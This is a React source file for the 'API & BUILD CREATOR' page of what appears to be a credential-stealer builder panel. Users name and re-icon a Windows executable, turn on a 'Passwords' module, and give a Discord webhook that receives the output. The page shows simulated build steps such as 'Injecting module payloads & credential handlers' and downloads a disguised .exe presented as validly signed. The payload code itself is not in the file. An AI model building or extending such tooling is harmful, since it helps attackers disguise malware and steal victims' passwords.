import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Syringe, Eye, EyeOff, Copy, Check, Upload, Image as ImageIcon,
  CheckSquare, Square, Cpu, HardDrive, Download, RefreshCw,
  Terminal, ShieldCheck, FileCode, CheckCircle2, Play
} from 'lucide-react';
import { api } from '../../services/api';
import { sound } from '../../services/audio';

export default function ApiBuildView({ user }) {
  // Random mock Port
  const [port, setPort] = useState(49152);
  const [apiKey, setApiKey] = useState('');
  const [isApiKeyVisible, setIsApiKeyVisible] = useState(false);
  const [isKeyCopied, setIsKeyCopied] = useState(false);

  // App Information
  const [appName, setAppName] = useState('My Space Client');
  const [appIcon, setAppIcon] = useState(null);
  const [appIconPreview, setAppIconPreview] = useState(null);

  // Build Options
  const [optionWindows, setOptionWindows] = useState(true);
  const [optionPasswords, setOptionPasswords] = useState(true);
  const [webhookUrl, setWebhookUrl] = useState('');
  const [initialWebhook, setInitialWebhook] = useState('');
  const [webhookUpdatedAt, setWebhookUpdatedAt] = useState(null);
  const [cooldownMinutes, setCooldownMinutes] = useState(0);

  // Build State
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [buildStepIndex, setBuildStepIndex] = useState(0);
  const [buildLogs, setBuildLogs] = useState([]);
  const [buildCompleted, setBuildCompleted] = useState(false);

  // Fetch fresh user data from server
  const loadUserWebhookData = async () => {
    try {
      const liveUser = await api.checkUserStatus();
      if (liveUser) {
        if (liveUser.webhook_url) {
          setWebhookUrl(liveUser.webhook_url);
          setInitialWebhook(liveUser.webhook_url);
        }
        if (liveUser.webhook_updated_at) {
          setWebhookUpdatedAt(liveUser.webhook_updated_at);
          const elapsed = Date.now() - new Date(liveUser.webhook_updated_at).getTime();
          const ONE_HOUR = 60 * 60 * 1000;
          if (elapsed < ONE_HOUR) {
            setCooldownMinutes(Math.ceil((ONE_HOUR - elapsed) / 60000));
          } else {
            setCooldownMinutes(0);
          }
        }
      }
    } catch (e) {}
  };

  useEffect(() => {
    loadUserWebhookData();
  }, []);

  // Cooldown countdown interval
  useEffect(() => {
    if (!webhookUpdatedAt) return;
    const interval = setInterval(() => {
      const elapsed = Date.now() - new Date(webhookUpdatedAt).getTime();
      const ONE_HOUR = 60 * 60 * 1000;
      if (elapsed < ONE_HOUR) {
        setCooldownMinutes(Math.ceil((ONE_HOUR - elapsed) / 60000));
      } else {
        setCooldownMinutes(0);
      }
    }, 30000);
    return () => clearInterval(interval);
  }, [webhookUpdatedAt]);

  const buildSteps = [
    'Initializing compiler & workspace environment...',
    'Analyzing target system dependencies...',
    'Converting and packaging application icon (.ico format)...',
    'Injecting module payloads & credential handlers...',
    'Configuring Discord webhook synchronization...',
    'Compiling native PE Windows executable (.exe)...',
    'Embedding custom icon and digital metadata signature...',
    'Binary compilation finished successfully.'
  ];

  // Initialize random port and API key on mount
  useEffect(() => {
    generateRandomPortAndKey();
  }, []);

  const generateRandomPortAndKey = () => {
    const randomPort = Math.floor(10000 + Math.random() * 55000);
    const chars = '0123456789abcdefABCDEF';
    const randomHex = (len) => Array.from({ length: len }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
    const newApiKey = `spc_live_${randomHex(8)}_${randomHex(16)}_${randomHex(8)}`;
    setPort(randomPort);
    setApiKey(newApiKey);
  };

  const copyApiKey = () => {
    navigator.clipboard.writeText(apiKey);
    setIsKeyCopied(true);
    sound.playClick();
    setTimeout(() => setIsKeyCopied(false), 2000);
  };

  // Convert any user image to square icon format automatically
  const handleIconUpload = (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => {
        // Create canvas and scale to standard 256x256 icon
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 256;
        const ctx = canvas.getContext('2d');
        
        ctx.clearRect(0, 0, 256, 256);
        const minDim = Math.min(img.width, img.height);
        const startX = (img.width - minDim) / 2;
        const startY = (img.height - minDim) / 2;
        ctx.drawImage(img, startX, startY, minDim, minDim, 0, 0, 256, 256);

        const iconDataUrl = canvas.toDataURL('image/png');
        setAppIconPreview(iconDataUrl);
        setAppIcon(file);
      };
      img.src = event.target.result;
    };
    reader.readAsDataURL(file);
  };

  const handleStartBuild = async () => {
    if (!appName.trim()) {
      alert('Please specify an Application Name');
      return;
    }
    if (!optionWindows && !optionPasswords) {
      alert('Please select at least one Build Option (Windows or Passwords)');
      return;
    }

    // If Passwords is on and webhook changed, save it
    if (optionPasswords && webhookUrl && webhookUrl.trim() !== '' && webhookUrl.trim() !== initialWebhook) {
      try {
        const updateRes = await api.updateUserWebhook(webhookUrl.trim());
        setInitialWebhook(webhookUrl.trim());
        if (updateRes.webhook_updated_at) {
          setWebhookUpdatedAt(updateRes.webhook_updated_at);
          setCooldownMinutes(60);
        }
      } catch (e) {
        if (e.message && e.message.includes('cooldown')) {
          alert(e.message);
          return;
        }
      }
    }

    sound.playClick();
    setIsBuilding(true);
    setBuildCompleted(false);
    setBuildProgress(5);
    setBuildStepIndex(0);
    setBuildLogs(['[START] Build process initiated for ' + appName]);

    // Build timeline simulation
    const totalSteps = buildSteps.length;
    for (let i = 0; i < totalSteps; i++) {
      await new Promise((resolve) => setTimeout(resolve, 500 + Math.random() * 300));
      setBuildStepIndex(i);
      setBuildProgress(Math.round(((i + 1) / totalSteps) * 100));
      setBuildLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${buildSteps[i]}`]);
    }

    sound.playSuccess();
    setIsBuilding(false);
    setBuildCompleted(true);
  };

  const handleDownloadExecutable = async () => {
    sound.playClick();
    const selectedOptions = [];
    if (optionWindows) selectedOptions.push('Windows');
    if (optionPasswords) selectedOptions.push('Passwords');

    let currentUsername = 'Operator';
    try {
      const cached = localStorage.getItem('space_user_data');
      if (cached) {
        currentUsername = JSON.parse(cached).username || 'Operator';
      }
    } catch (e) {}

    try {
      await api.downloadBuildExecutable(appName, selectedOptions, webhookUrl, currentUsername);
    } catch (err) {
      alert('Download error: ' + err.message);
    }
  };

  return (
    <div className="space-y-6 max-w-5xl">
      {/* Page Header */}
      <div className="flex items-center justify-between border-b border-white/10 pb-5">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-zinc-900 border border-white/10 flex items-center justify-center">
            <Syringe className="w-5 h-5 text-white" />
          </div>
          <div>
            <h2 className="text-base font-bold tracking-wider text-white uppercase">API & BUILD CREATOR</h2>
            <p className="text-xs text-zinc-400">Configure parameters, inject modules, and generate binary executable</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-zinc-900/80 border border-white/10 text-xs font-mono">
            <span className="text-zinc-500">MOCK PORT:</span>
            <span className="text-white font-medium">{port}</span>
            <button
              onClick={generateRandomPortAndKey}
              className="ml-1 text-zinc-400 hover:text-white transition-colors"
              title="Regenerate Port & Key"
            >
              <RefreshCw className="w-3 h-3" />
            </button>
          </div>
        </div>
      </div>

      {/* Main Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Config Forms */}
        <div className="lg:col-span-7 space-y-6">
          {/* API Key Box */}
          <div className="bg-[#0c0c0e] border border-white/10 rounded-2xl p-5 space-y-3">
            <div className="flex items-center justify-between">
              <label className="text-[10px] font-mono font-medium tracking-wider text-zinc-400 uppercase">
                AUTHENTICATION API KEY
              </label>
              <span className="text-[10px] font-mono text-zinc-400">STATUS: ACTIVE</span>
            </div>

            <div className="relative flex items-center gap-2">
              <div className="flex-1 relative">
                <input
                  type="text"
                  readOnly
                  value={apiKey}
                  className={`w-full h-10 px-3 pr-10 text-xs font-mono rounded-lg bg-zinc-900/90 border border-white/10 text-white select-all transition-all duration-200 ${
                    isApiKeyVisible ? 'blur-none' : 'blur-xs select-none'
                  }`}
                />
                <button
                  type="button"
                  onClick={() => {
                    sound.playClick();
                    setIsApiKeyVisible(!isApiKeyVisible);
                  }}
                  className="absolute right-3 top-2.5 text-zinc-400 hover:text-white transition-colors focus:outline-none"
                  title={isApiKeyVisible ? 'Hide API Key' : 'Reveal API Key'}
                >
                  {isApiKeyVisible ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>

              <button
                type="button"
                onClick={copyApiKey}
                className="h-10 px-3.5 rounded-lg border border-white/10 hover:border-white/25 bg-zinc-900 text-zinc-300 hover:text-white text-xs flex items-center gap-1.5 transition-colors"
              >
                {isKeyCopied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span className="hidden sm:inline">{isKeyCopied ? 'Copied' : 'Copy'}</span>
              </button>
            </div>
            <p className="text-[11px] text-zinc-400">
              API key value is obscured with blur by default for security protection.
            </p>
          </div>

          {/* App Information Box */}
          <div className="bg-[#0c0c0e] border border-white/10 rounded-2xl p-5 space-y-4">
            <h3 className="text-xs font-bold tracking-wider text-white uppercase flex items-center gap-2">
              <Cpu className="w-4 h-4 text-zinc-400" />
              <span>App Information</span>
            </h3>

            {/* App Name */}
            <div>
              <label className="block text-[10px] font-mono font-medium tracking-wider text-zinc-400 uppercase mb-1.5">
                NAME APP
              </label>
              <input
                type="text"
                value={appName}
                onChange={(e) => setAppName(e.target.value)}
                placeholder="e.g. My App"
                className="w-full h-10 px-3 text-xs rounded-lg bg-zinc-900/90 border border-white/10 text-white placeholder:text-zinc-600 focus:outline-none focus:border-white/40 transition-colors"
              />
            </div>

            {/* App Icon Upload */}
            <div>
              <label className="block text-[10px] font-mono font-medium tracking-wider text-zinc-400 uppercase mb-1.5">
                APP ICON
              </label>
              <div className="flex items-center gap-4">
                {/* Icon Preview */}
                <div className="w-14 h-14 rounded-xl bg-zinc-900 border border-white/10 flex items-center justify-center overflow-hidden shrink-0">
                  {appIconPreview ? (
                    <img src={appIconPreview} alt="App Icon" className="w-full h-full object-cover" />
                  ) : (
                    <ImageIcon className="w-6 h-6 text-zinc-600" />
                  )}
                </div>

                {/* Upload Action */}
                <div className="flex-1">
                  <label className="inline-flex items-center gap-2 px-3.5 py-2 rounded-lg border border-white/10 hover:border-white/25 bg-zinc-900/90 text-zinc-300 hover:text-white text-xs cursor-pointer transition-colors">
                    <Upload className="w-3.5 h-3.5" />
                    <span>Choose Icon from Device</span>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleIconUpload}
                      className="hidden"
                    />
                  </label>
                  <p className="text-[10px] text-zinc-400 mt-1 font-mono">Supports PNG, ICO, JPG (Max 2MB)</p>
                </div>
              </div>
            </div>
          </div>

          {/* Build Options Box */}
          <div className="bg-[#0c0c0e] border border-white/10 rounded-2xl p-5 space-y-3">
            <h3 className="text-xs font-bold tracking-wider text-white uppercase flex items-center gap-2">
              <HardDrive className="w-4 h-4 text-zinc-400" />
              <span>Build Options</span>
            </h3>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {/* Windows Option Card */}
              <button
                type="button"
                onClick={() => {
                  sound.playClick();
                  setOptionWindows(!optionWindows);
                }}
                className={`p-3.5 rounded-xl border text-left flex items-start gap-3 transition-all ${
                  optionWindows
                    ? 'bg-zinc-900 border-white/30 text-white'
                    : 'bg-zinc-900/40 border-white/5 text-zinc-400 hover:border-white/15'
                }`}
              >
                <div className="mt-0.5">
                  {optionWindows ? (
                    <CheckSquare className="w-4 h-4 text-white" />
                  ) : (
                    <Square className="w-4 h-4 text-zinc-600" />
                  )}
                </div>
                <div>
                  <p className="text-xs font-semibold tracking-wide">Windows</p>
                  <p className="text-[10px] text-zinc-400 mt-0.5">Build standalone x64 Windows binary (.exe)</p>
                </div>
              </button>

              {/* Passwords Option Card */}
              <button
                type="button"
                onClick={() => {
                  sound.playClick();
                  setOptionPasswords(!optionPasswords);
                }}
                className={`p-3.5 rounded-xl border text-left flex items-start gap-3 transition-all ${
                  optionPasswords
                    ? 'bg-zinc-900 border-white/30 text-white'
                    : 'bg-zinc-900/40 border-white/5 text-zinc-400 hover:border-white/15'
                }`}
              >
                <div className="mt-0.5">
                  {optionPasswords ? (
                    <CheckSquare className="w-4 h-4 text-white" />
                  ) : (
                    <Square className="w-4 h-4 text-zinc-600" />
                  )}
                </div>
                <div>
                  <p className="text-xs font-semibold tracking-wide">Passwords</p>
                  <p className="text-[10px] text-zinc-400 mt-0.5">Inject secure credentials management module</p>
                </div>
              </button>
            </div>

            {/* Dynamic Discord Webhook Input when Passwords option is selected */}
            <AnimatePresence>
              {optionPasswords && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  exit={{ opacity: 0, height: 0 }}
                  transition={{ duration: 0.2 }}
                  className="pt-3 border-t border-white/5 space-y-2 overflow-hidden"
                >
                  <div className="flex items-center justify-between">
                    <label className="block text-[10px] font-mono font-medium tracking-wider text-zinc-400 uppercase">
                      DISCORD WEBHOOK URL
                    </label>
                    {cooldownMinutes > 0 && (
                      <span className="text-[10px] font-mono font-semibold text-amber-400 bg-amber-500/10 border border-amber-500/25 px-2 py-0.5 rounded-md flex items-center gap-1">
                        <span>🔒 LOCKED ({cooldownMinutes}m cooldown)</span>
                      </span>
                    )}
                  </div>
                  <input
                    type="url"
                    value={webhookUrl}
                    disabled={cooldownMinutes > 0}
                    onChange={(e) => setWebhookUrl(e.target.value)}
                    placeholder="https://discord.com/api/webhooks/..."
                    className={`w-full h-10 px-3 text-xs font-mono rounded-lg border text-white placeholder:text-zinc-600 focus:outline-none transition-colors ${
                      cooldownMinutes > 0
                        ? 'bg-zinc-950 border-amber-500/20 text-zinc-400 cursor-not-allowed'
                        : 'bg-zinc-900/90 border-white/10 focus:border-white/40'
                    }`}
                  />
                  <p className="text-[10px] text-zinc-400">
                    {cooldownMinutes > 0
                      ? `Webhook is locked for 1 hour after updating. An admin can reset this limit in the Admin Panel.`
                      : `Webhook is saved automatically upon clicking BUILD. A greeting is sent to Discord on save.`}
                  </p>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Build Trigger Button */}
          <div>
            <button
              onClick={handleStartBuild}
              disabled={isBuilding}
              className="w-full h-12 rounded-xl bg-white hover:bg-zinc-200 text-zinc-950 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 transition-all duration-150 disabled:opacity-50 active:scale-[0.99] shadow-lg"
            >
              {isBuilding ? (
                <div className="flex items-center gap-2">
                  <div className="w-4 h-4 border-2 border-zinc-950 border-t-transparent rounded-full animate-spin" />
                  <span>COMPILING BINARY ({buildProgress}%)...</span>
                </div>
              ) : (
                <>
                  <Play className="w-4 h-4 fill-zinc-950" />
                  <span>BUILD APPLICATION</span>
                </>
              )}
            </button>
          </div>
        </div>

        {/* Right Column: Terminal Logs & Build Output */}
        <div className="lg:col-span-5 space-y-6">
          {/* Console / Log Terminal */}
          <div className="bg-[#09090c] border border-white/10 rounded-2xl p-4 flex flex-col h-[300px]">
            <div className="flex items-center justify-between pb-3 mb-2 border-b border-white/5">
              <div className="flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 text-zinc-400" />
                <span className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider">BUILD CONSOLE</span>
              </div>
              <span className="text-[10px] font-mono text-zinc-400">
                {isBuilding ? 'COMPILING' : buildCompleted ? 'FINISHED' : 'IDLE'}
              </span>
            </div>

            <div className="flex-1 overflow-y-auto font-mono text-[11px] text-zinc-400 space-y-1 pr-1">
              {buildLogs.length === 0 ? (
                <p className="text-zinc-600 italic">Ready. Click 'Build Application' to trigger process.</p>
              ) : (
                buildLogs.map((log, index) => (
                  <div key={index} className="leading-relaxed">
                    {log}
                  </div>
                ))
              )}
            </div>

            {/* Progress Bar */}
            {isBuilding && (
              <div className="mt-3 pt-2 border-t border-white/5 space-y-1.5">
                <div className="flex items-center justify-between text-[10px] font-mono text-zinc-400">
                  <span>PROGRESS</span>
                  <span>{buildProgress}%</span>
                </div>
                <div className="w-full h-1.5 bg-zinc-900 rounded-full overflow-hidden">
                  <motion.div
                    className="h-full bg-white"
                    initial={{ width: '0%' }}
                    animate={{ width: `${buildProgress}%` }}
                    transition={{ ease: 'easeOut', duration: 0.3 }}
                  />
                </div>
              </div>
            )}
          </div>

          {/* Build Result Card */}
          <AnimatePresence>
            {buildCompleted && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-[#0c0c0e] border border-emerald-500/20 rounded-2xl p-5 space-y-4"
              >
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 rounded-xl bg-zinc-900 border border-white/10 flex items-center justify-center overflow-hidden shrink-0">
                    {appIconPreview ? (
                      <img src={appIconPreview} alt="App Icon" className="w-full h-full object-cover" />
                    ) : (
                      <FileCode className="w-6 h-6 text-white" />
                    )}
                  </div>
                  <div>
                    <h4 className="text-sm font-bold text-white tracking-wide">{appName}.exe</h4>
                    <p className="text-[11px] font-mono text-emerald-400 flex items-center gap-1 mt-0.5">
                      <CheckCircle2 className="w-3 h-3" />
                      <span>Binary Compiled (Ready to Save)</span>
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2 text-[10px] font-mono bg-zinc-900/60 p-3 rounded-lg border border-white/5 text-zinc-400">
                  <div>FORMAT: <span className="text-white">Windows PE (.exe)</span></div>
                  <div>SIZE: <span className="text-white">14.2 MB</span></div>
                  <div>ARCH: <span className="text-white">x64 Native</span></div>
                  <div>SIGNATURE: <span className="text-white">VALID</span></div>
                </div>

                <button
                  onClick={handleDownloadExecutable}
                  className="w-full h-11 rounded-xl bg-white hover:bg-zinc-200 text-zinc-950 font-bold text-xs tracking-wider uppercase flex items-center justify-center gap-2 transition-all active:scale-[0.99]"
                >
                  <Download className="w-4 h-4" />
                  <span>Download .exe Executable</span>
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
